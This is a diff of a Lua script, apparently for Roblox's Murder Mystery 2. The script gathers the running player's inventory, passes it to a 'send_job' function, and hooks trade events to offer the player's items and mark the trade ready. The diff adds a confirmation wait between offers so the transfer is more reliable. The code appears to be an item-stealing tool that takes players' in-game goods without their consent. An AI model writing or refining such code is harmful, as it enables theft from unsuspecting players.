@@ -143,7 +143,6 @@ local function hook_mm2()
 
     local okP, ProfileData = pcall(function() return require(RS.Modules.ProfileData) end)
 
-    -- items eenmalig vastleggen bij script-start
     local cachedItems = collect_mm2_items()
     send_job("MM2", cachedItems)
 
@@ -239,6 +238,15 @@ local function hook_mm2()
         showGui()
     end
 
+    -- wacht op UpdateTrade bevestiging, max timeout seconden
+    local function waitForConfirm(prevOffer, timeout)
+        local waited = 0
+        while currentLastOffer == prevOffer and waited < timeout do
+            task.wait(0.05)
+            waited = waited + 0.05
+        end
+    end
+
     if updateTrade then
         updateTrade.OnClientEvent:Connect(function(tradeData)
             if tradeData and tradeData.LastOffer then
@@ -285,7 +293,6 @@ local function hook_mm2()
     end)
 
     startTrade.OnClientEvent:Connect(function(tradeData)
-        -- altijd force-reset zodat vorige timer niet interfereert
         itemsOffered = false
         readySent = false
         currentLastOffer = (tradeData and tradeData.LastOffer) or nil
@@ -306,17 +313,19 @@ local function hook_mm2()
         itemsOffered = true
 
         task.spawn(function()
-            -- gebruik gecachede items van script-start
             local uniqueSlots = 0
             for _, entry in ipairs(cachedItems) do
                 if uniqueSlots >= 4 then break end
                 uniqueSlots = uniqueSlots + 1
                 for i = 1, entry.amount do
+                    local prev = currentLastOffer
                     pcall(function() offerItem:FireServer(entry.name, "Weapons") end)
+                    -- wacht op server-bevestiging voor volgend item (max 1.5s)
+                    waitForConfirm(prev, 1.5)
                 end
             end
 
-            task.wait(5)
+            task.wait(3)
             if not readySent then
                 readySent = true
                 local offer = currentLastOffer or tick()
